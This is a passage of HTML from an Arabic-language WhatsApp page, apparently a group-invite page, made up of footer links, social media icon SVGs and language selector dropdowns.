                                                                                d="M19.8951 5.89L18.8451 1.52C18.6251 0.62 17.8451 0 16.9351 0H14.7251H12.7151H10.9951H8.99512H7.27512H5.25512H3.04512C2.14512 0 1.35512 0.63 1.14512 1.52L0.0951238 5.89C-0.144876 6.91 0.0751239 7.95 0.715124 8.77C0.795124 8.88 0.905124 8.96 0.995124 9.06V16C0.995124 17.1 1.89512 18 2.99512 18H16.9951C18.0951 18 18.9951 17.1 18.9951 16V9.06C19.0851 8.97 19.1951 8.88 19.2751 8.78C19.9151 7.96 20.1451 6.91 19.8951 5.89ZM5.01512 2L4.43512 6.86C4.35512 7.51 3.83512 8 3.22512 8C2.73512 8 2.42512 7.71 2.29512 7.53C2.03512 7.2 1.94512 6.77 2.04512 6.36L3.04512 2H5.01512ZM16.9051 1.99L17.9551 6.36C18.0551 6.78 17.9651 7.2 17.7051 7.53C17.5651 7.71 17.2651 8 16.7651 8C16.1551 8 15.6251 7.51 15.5551 6.86L14.9751 2L16.9051 1.99ZM13.5051 6.52C13.5551 6.91 13.4351 7.3 13.1751 7.59C12.9451 7.85 12.6251 8 12.2151 8C11.5451 8 10.9951 7.41 10.9951 6.69V2H12.9551L13.5051 6.52ZM8.99512 6.69C8.99512 7.41 8.44512 8 7.70512 8C7.36512 8 7.05512 7.85 6.81512 7.59C6.56512 7.3 6.44512 6.91 6.48512 6.52L7.03512 2H8.99512V6.69ZM15.9951 16H3.99512C3.44512 16 2.99512 15.55 2.99512 15V9.97C3.07512 9.98 3.14512 10 3.22512 10C4.09512 10 4.88512 9.64 5.46512 9.05C6.06512 9.65 6.86512 10 7.77512 10C8.64512 10 9.42512 9.64 10.0051 9.07C10.5951 9.64 11.3951 10 12.2951 10C13.1351 10 13.9351 9.65 14.5351 9.05C15.1151 9.64 15.9051 10 16.7751 10C16.8551 10 16.9251 9.98 17.0051 9.97V15C16.9951 15.55 16.5451 16 15.9951 16Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span><span><span class="_afog"><span
                                                                                class="_9vg3 _aj1b" style="">واتساب
                                                                                للأعمال</span></span><svg
                                                                            class="_wauiIcon__go-to-icon _agnt _afok"
                                                                            width="10" height="10" fill="none"
                                                                            xmlns="http://www.w3.org/2000/svg">
                                                                            <path fill-rule="evenodd"
                                                                                clip-rule="evenodd"
                                                                                d="M1.214.447a.75.75 0 0 0-.005 1.5l5.712.023L.645 8.245a.75.75 0 1 0 1.06 1.06L7.983 3.03l.022 5.713a.75.75 0 1 0 1.5-.006l-.03-7.487a.748.748 0 0 0-.779-.774L1.215.447Z"
                                                                                fill="currentColor"></path>
                                                                        </svg></span></a></div>
                                                        </div>
                                                    </li>
                                                </ul>
                                            </div>
                                        </li>
                                        <li class="_9t0h"><a href="https://www.whatsapp.com/privacy"
                                                class="_aeo9 _9vcv"><span class="_advp _aeam">الخصوصية</span></a></li>
                                        <li class="_9t0h"><a href="https://faq.whatsapp.com/" class="_aeo9 _9vcv"><span
                                                    class="_advp _aeam">مركز المساعدة</span></a></li>
                                        <li class="_9t0h"><a href="https://blog.whatsapp.com/" class="_aeo9 _9vcv"><span
                                                    class="_advp _aeam">المدونة</span></a></li>
                                    </ul>
                                    <div class="_ag12">
                                        <div class="_9tar _9ta3 _9ta5 _9ta8 _9tau _ag14">
                                            <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                                <div class="_ag13"><a href="https://www.whatsapp.com/download"
                                                        class="_aeo8 _9vcv _9u4o _a805 _9scc _9scs"
                                                        data-ms="{&quot;creative&quot;:&quot;link&quot;}"><span
                                                            class="_advp _aeam">تنزيل</span><span><svg width="16"
                                                                height="16" viewBox="0 0 16 16" fill="none"
                                                                class="_wauiIcon__download-alternative _agnt _9u4c">
                                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                                    d="M13.75 13.75C13.75 14.1642 13.4142 14.5 13 14.5L3 14.5C2.58579 14.5 2.25 14.1642 2.25 13.75C2.25 13.3358 2.58579 13 3 13L13 13C13.4142 13 13.75 13.3358 13.75 13.75Z"
                                                                    fill="currentColor"></path>
                                                                <path fill-rule="evenodd" clip-rule="evenodd"
                                                                    d="M8.7487 2C8.7487 1.58579 8.41291 1.25 7.9987 1.25C7.58448 1.25 7.2487 1.58579 7.2487 2L7.2487 9.53955L3.19233 5.51449C2.89831 5.22274 2.42344 5.22458 2.13168 5.5186C1.83993 5.81263 1.84177 6.2875 2.13579 6.57925L7.46912 11.8714C7.76154 12.1616 8.23325 12.1616 8.52567 11.8714L13.859 6.57926C14.153 6.2875 14.1549 5.81263 13.8631 5.5186C13.5714 5.22458 13.0965 5.22274 12.8025 5.51449L8.7487 9.53697L8.7487 2Z"
                                                                    fill="currentColor"></path>
                                                            </svg></span></a></div>
                                            </div>
                                            <div class="_9vd6 _9t33 _9bir _9bj3 _9bhd _9v12 _9tau">
                                                <div class="_ag1m"><a aria-label="twitter link"
                                                        href="https://twitter.com/whatsapp" class="_afwh _adig _ad_c"
                                                        target="_blank" rel="noopener"><svg viewBox="0 0 19 16"
                                                            width="19" height="16" fill="none"
                                                            class="_aghm _adid _afbl">
                                                            <path
                                                                d="M18.3087 2.19814C17.7317 2.43004 17.1358 2.5943 16.521 2.67161C16.5116 2.66194 16.5021 2.66194 16.4926 2.65228C17.2588 2.15948 17.7885 1.47344 18.0817 0.584469C18.0533 0.603794 18.0439 0.603795 18.0249 0.613457C17.325 1.02895 16.5778 1.31883 15.7832 1.49276C15.7359 1.50242 15.7076 1.49276 15.6792 1.45411C14.8279 0.594132 13.7969 0.207624 12.6051 0.333239C11.8106 0.420203 11.1201 0.729409 10.5336 1.28984C9.51207 2.26578 9.13373 3.47361 9.38912 4.88436C9.39858 4.94234 9.39857 4.96166 9.33236 4.96166C8.8878 4.93267 8.43377 4.88436 7.99866 4.7974C7.07171 4.62347 6.1826 4.32393 5.34077 3.89877C4.05438 3.26103 2.9477 2.39139 2.00182 1.28984C1.92615 1.20288 1.85049 1.11592 1.77482 1.01929C1.49106 1.46377 1.23567 2.22712 1.2735 3.03879C1.33025 4.32392 1.88832 5.31918 2.9004 6.06321C2.3045 6.04388 1.75588 5.87962 1.23565 5.58974C1.23565 6.49803 1.50052 7.30969 2.05858 8.00541C2.61665 8.71078 3.32605 9.1456 4.20572 9.34852C4.17734 9.35818 4.15843 9.36784 4.13951 9.36784C3.6382 9.49346 3.12741 9.51278 2.61664 9.42582C2.54097 9.41615 2.54097 9.41616 2.56935 9.49346C2.68285 9.83165 2.83418 10.1409 3.03282 10.4307C3.62872 11.2811 4.42326 11.8028 5.42589 11.9864C5.6056 12.0251 5.79479 12.0347 6.00288 12.0444C4.37597 13.3102 2.5599 13.8223 0.545181 13.6194C0.55464 13.6291 0.56409 13.6387 0.583007 13.6484C1.32079 14.1219 2.10587 14.4987 2.92878 14.7789C3.84628 15.0881 4.78271 15.2621 5.7475 15.3007C6.24881 15.3201 6.75959 15.3104 7.2609 15.2621C7.81897 15.2138 8.36757 15.1171 8.91618 14.9819C10.7985 14.4987 12.4065 13.5421 13.7496 12.112C14.8468 10.9332 15.6413 9.57076 16.1616 8.03439C16.4453 7.2034 16.6251 6.34342 16.7007 5.46412C16.7386 5.01964 16.748 4.57515 16.7291 4.13067C16.7291 4.0727 16.748 4.04371 16.7859 4.00506C17.4574 3.49293 18.0344 2.89385 18.5074 2.18847C18.5168 2.16915 18.5452 2.14982 18.5452 2.11117C18.4601 2.14016 18.3844 2.16915 18.3087 2.19814Z"
                                                                fill="currentColor"></path>
                                                        </svg></a><a aria-label="youtube link"
                                                        href="https://www.youtube.com/channel/UCAuerig2N-RZWJT8x75V9yw"
                                                        class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg
                                                            width="23" height="16" viewBox="0 0 23 16" fill="none"
                                                            xmlns="http://www.w3.org/2000/svg"
                                                            class="_wauiIcon__youtube _adid _afbl">
                                                            <path
                                                                d="M22.0088 5.95168C22.0583 4.52034 21.7452 3.0997 21.0988 1.82168C20.6602 1.29728 20.0515 0.943393 19.3788 0.821683C16.5963 0.569209 13.8023 0.465727 11.0088 0.511683C8.22546 0.463642 5.44152 0.563783 2.66882 0.811683C2.12064 0.9114 1.61333 1.16853 1.20882 1.55168C0.308816 2.38168 0.208816 3.80168 0.108816 5.00168C-0.036272 7.15925 -0.036272 9.32412 0.108816 11.4817C0.137746 12.1571 0.23831 12.8275 0.408816 13.4817C0.529391 13.9867 0.773339 14.454 1.11882 14.8417C1.52608 15.2451 2.0452 15.5169 2.60882 15.6217C4.76473 15.8878 6.93703 15.9981 9.10882 15.9517C12.6088 16.0017 15.6788 15.9517 19.3088 15.6717C19.8863 15.5733 20.42 15.3012 20.8388 14.8917C21.1188 14.6116 21.3279 14.2688 21.4488 13.8917C21.8064 12.7943 21.9821 11.6458 21.9688 10.4917C22.0088 9.93168 22.0088 6.55168 22.0088 5.95168ZM8.74882 11.0917V4.90168L14.6688 8.01168C13.0088 8.93168 10.8188 9.97168 8.74882 11.0917Z"
                                                                fill="currentColor"></path>
                                                        </svg></a><a aria-label="Instagram link"
                                                        href="https://www.instagram.com/whatsapp/?hl=en"
                                                        class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg
                                                            width="20" height="21" viewBox="0 0 20 21" fill="none"
                                                            xmlns="http://www.w3.org/2000/svg"
                                                            class="_wauiIcon__instagram _adid _afbl">
                                                            <path
                                                                d="M15.34 3.96C15.1027 3.96 14.8707 4.03038 14.6733 4.16224C14.476 4.29409 14.3222 4.48151 14.2313 4.70078C14.1405 4.92005 14.1168 5.16133 14.1631 5.39411C14.2094 5.62689 14.3236 5.84071 14.4915 6.00853C14.6593 6.17635 14.8731 6.29064 15.1059 6.33694C15.3387 6.38324 15.5799 6.35948 15.7992 6.26866C16.0185 6.17783 16.2059 6.02402 16.3378 5.82668C16.4696 5.62935 16.54 5.39734 16.54 5.16C16.54 4.84174 16.4136 4.53652 16.1885 4.31147C15.9635 4.08643 15.6583 3.96 15.34 3.96ZM19.94 6.38C19.9206 5.5503 19.7652 4.7294 19.48 3.95C19.2257 3.28313 18.83 2.67928 18.32 2.18C17.8248 1.66743 17.2196 1.27418 16.55 1.03C15.7727 0.736161 14.9508 0.57721 14.12 0.56C13.06 0.5 12.72 0.5 10 0.5C7.28 0.5 6.94 0.5 5.88 0.56C5.04915 0.57721 4.22734 0.736161 3.45 1.03C2.78168 1.27665 2.17693 1.66956 1.68 2.18C1.16743 2.67518 0.774176 3.28044 0.53 3.95C0.236161 4.72734 0.07721 5.54915 0.0599999 6.38C-5.58794e-08 7.44 0 7.78 0 10.5C0 13.22 -5.58794e-08 13.56 0.0599999 14.62C0.07721 15.4508 0.236161 16.2727 0.53 17.05C0.774176 17.7196 1.16743 18.3248 1.68 18.82C2.17693 19.3304 2.78168 19.7234 3.45 19.97C4.22734 20.2638 5.04915 20.4228 5.88 20.44C6.94 20.5 7.28 20.5 10 20.5C12.72 20.5 13.06 20.5 14.12 20.44C14.9508 20.4228 15.7727 20.2638 16.55 19.97C17.2196 19.7258 17.8248 19.3326 18.32 18.82C18.8322 18.3226 19.2283 17.7182 19.48 17.05C19.7652 16.2706 19.9206 15.4497 19.94 14.62C19.94 13.56 20 13.22 20 10.5C20 7.78 20 7.44 19.94 6.38ZM18.14 14.5C18.1327 15.1348 18.0178 15.7637 17.8 16.36C17.6403 16.7952 17.3839 17.1884 17.05 17.51C16.7256 17.8405 16.3332 18.0964 15.9 18.26C15.3037 18.4778 14.6748 18.5927 14.04 18.6C13.04 18.65 12.67 18.66 10.04 18.66C7.41 18.66 7.04 18.66 6.04 18.6C5.38089 18.6123 4.72459 18.5109 4.1 18.3C3.68578 18.1281 3.31136 17.8728 3 17.55C2.66809 17.2287 2.41484 16.8352 2.26 16.4C2.01586 15.7952 1.88044 15.1519 1.86 14.5C1.86 13.5 1.8 13.13 1.8 10.5C1.8 7.87 1.8 7.5 1.86 6.5C1.86448 5.85106 1.98295 5.20795 2.21 4.6C2.38605 4.17791 2.65627 3.80166 3 3.5C3.30381 3.15617 3.67929 2.8831 4.1 2.7C4.70955 2.48004 5.352 2.36508 6 2.36C7 2.36 7.37 2.3 10 2.3C12.63 2.3 13 2.3 14 2.36C14.6348 2.36728 15.2637 2.48225 15.86 2.7C16.3144 2.86865 16.7223 3.14285 17.05 3.5C17.3777 3.80718 17.6338 4.18273 17.8 4.6C18.0223 5.20893 18.1373 5.85178 18.14 6.5C18.19 7.5 18.2 7.87 18.2 10.5C18.2 13.13 18.19 13.5 18.14 14.5ZM10 5.37C8.98581 5.37198 7.99496 5.67453 7.15265 6.23942C6.31035 6.80431 5.65438 7.6062 5.26763 8.54375C4.88089 9.48131 4.78072 10.5125 4.97979 11.5069C5.17886 12.5014 5.66824 13.4145 6.38608 14.131C7.10392 14.8474 8.01801 15.335 9.01286 15.5321C10.0077 15.7293 11.0387 15.6271 11.9755 15.2385C12.9123 14.85 13.7129 14.1924 14.2761 13.349C14.8394 12.5056 15.14 11.5142 15.14 10.5C15.1413 9.8251 15.0092 9.15661 14.7512 8.53296C14.4933 7.90931 14.1146 7.34281 13.6369 6.86605C13.1592 6.38929 12.5919 6.01168 11.9678 5.75493C11.3436 5.49818 10.6749 5.36736 10 5.37ZM10 13.83C9.34139 13.83 8.69757 13.6347 8.14995 13.2688C7.60234 12.9029 7.17552 12.3828 6.92348 11.7743C6.67144 11.1659 6.6055 10.4963 6.73398 9.85035C6.86247 9.20439 7.17963 8.61104 7.64533 8.14533C8.11104 7.67963 8.70439 7.36247 9.35035 7.23398C9.99631 7.1055 10.6659 7.17144 11.2743 7.42348C11.8828 7.67552 12.4029 8.10234 12.7688 8.64995C13.1347 9.19757 13.33 9.84139 13.33 10.5C13.33 10.9373 13.2439 11.3703 13.0765 11.7743C12.9092 12.1784 12.6639 12.5454 12.3547 12.8547C12.0454 13.1639 11.6784 13.4092 11.2743 13.5765C10.8703 13.7439 10.4373 13.83 10 13.83Z"
                                                                fill="currentColor"></path>
                                                        </svg></a><a aria-label="facebook link"
                                                        href="https://www.facebook.com/profile.php?id=100064758844406"
                                                        class="_afwh _adig _ad_c" target="_blank" rel="noopener"><svg
                                                            width="11" height="21" viewBox="0 0 11 21" fill="none"
                                                            xmlns="http://www.w3.org/2000/svg"
                                                            class="_wauiIcon__facebook-alt _adid _afbl">
                                                            <path
                                                                d="M8.51 3.82003H10.39V0.64003C9.47975 0.545377 8.56516 0.498646 7.65 0.50003C4.93 0.50003 3.07 2.16003 3.07 5.20003V7.82003H0V11.38H3.07V20.5H6.75V11.38H9.81L10.27 7.82003H6.75V5.55003C6.75 4.50003 7.03 3.82003 8.51 3.82003Z"
                                                                fill="currentColor"></path>
                                                        </svg></a></div>
                                            </div>
                                        </div>
                                        <div class="_9tar _9ta3 _9ta5 _9ta7 _9tau _ag1n">
                                            <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9v12 _9taw">
                                                <div class="_ag1o"><a href="https://www.whatsapp.com/" target="_blank"
                                                        class="_aeo9 _9vcv"><span class="_advp _aeam">شروط
                                                            الخدمة</span></a>&rlm;2023 ©&rlm; شركة WhatsApp LLC</div>
                                            </div>
                                            <div class="_9vd6 _9t33 _9bir _9biz _9bhj _9ta9">
                                                <div class="_9tjq">
                                                    <div class="_afoa"><select id="u_0_5_iX" class="_9tg0 _afo4 _afon">
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">
                                                                Azərbaycan</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">
                                                                Afrikaans</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">
                                                                Bahasa Indonesia</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">
                                                                Melayu</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">
                                                                Català</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">
                                                                čeština</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">
                                                                Dansk</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">
                                                                Deutsch</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">
                                                                Eesti</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en">
                                                                English</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">
                                                                Español</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">
                                                                Français</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">
                                                                Gaeilge</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">
                                                                Hrvatski</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">
                                                                Italiano</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">
                                                                Kiswahili</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">
                                                                Latviešu</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">
                                                                Lietuvių</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">
                                                                Magyar</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">
                                                                Nederlands</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">
                                                                Norsk bokmål</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">
                                                                O‘zbek</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">
                                                                Filipino</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">
                                                                Polski</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">
                                                                Português (Brasil)</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">
                                                                Português (Portugal)</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">
                                                                Română</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">
                                                                Shqip</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">
                                                                Slovenčina</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">
                                                                Slovenščina</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">
                                                                Suomi</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">
                                                                Svenska</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">
                                                                Tiếng Việt</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">
                                                                Türkçe</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">
                                                                Ελληνικά</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">
                                                                български</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">
                                                                қазақ тілі</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">
                                                                македонски</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">
                                                                русский</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">
                                                                српски</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">
                                                                українська</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">
                                                                עברית</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar"
                                                                selected="1">العربية</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">
                                                                فارسی</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">
                                                                اردو</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">
                                                                বাংলা</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">
                                                                हिन्दी</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">
                                                                ગુજરાતી</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">
                                                                ಕನ್ನಡ</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">
                                                                मराठी</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">
                                                                ਪੰਜਾਬੀ</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">
                                                                தமிழ்</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">
                                                                తెలుగు</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml">
                                                                മലയാളം</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=th">
                                                                ไทย</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn">
                                                                简体中文</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw">
                                                                繁體中文（台灣）</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk">
                                                                繁體中文（香港）</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja">
                                                                日本語</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko">
                                                                한국어</option>
                                                        </select><select id="u_0_6_mR" class="_9tg0 _afo4 _afoc">
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=az">
                                                                azərbaycan</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=af">
                                                                Afrikaans</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=id">
                                                                Bahasa Indonesia</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms">
                                                                Melayu</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca">
                                                                català</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs">
                                                                čeština</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=da">
                                                                dansk</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=de">
                                                                Deutsch</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=et">
                                                                eesti</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=en">
                                                                English</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=es">
                                                                español</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr">
                                                                français</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga">
                                                                Gaeilge</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr">
                                                                hrvatski</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=it">
                                                                italiano</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw">
                                                                Kiswahili</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv">
                                                                latviešu</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt">
                                                                lietuvių</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu">
                                                                magyar</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl">
                                                                Nederlands</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb">
                                                                norsk bokmål</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz">
                                                                o‘zbek</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl">
                                                                Filipino</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl">
                                                                polski</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br">
                                                                Português (Brasil)</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt">
                                                                Português (Portugal)</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro">
                                                                română</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq">
                                                                shqip</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk">
                                                                slovenčina</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl">
                                                                slovenščina</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi">
                                                                suomi</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv">
                                                                svenska</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi">
                                                                Tiếng Việt</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr">
                                                                Türkçe</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=el">
                                                                Ελληνικά</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg">
                                                                български</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk">
                                                                қазақ тілі</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk">
                                                                македонски</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru">
                                                                русский</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr">
                                                                српски</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk">
                                                                українська</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=he">
                                                                עברית</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar"
                                                                selected="1">العربية</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa">
                                                                فارسی</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur">
                                                                اردو</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn">
                                                                বাংলা</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi">
                                                                हिन्दी</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu">
                                                                ગુજરાતી</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn">
                                                                ಕನ್ನಡ</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr">
                                                                मराठी</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa">
                                                                ਪੰਜਾਬੀ</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta">
                                                                தமிழ்</option>
                                                            <option class="_afo9"
                                                                value="https://chat.whatsapp.com/--sanitized-S228802--?lang=te">
                                                                తెలుగు</option>
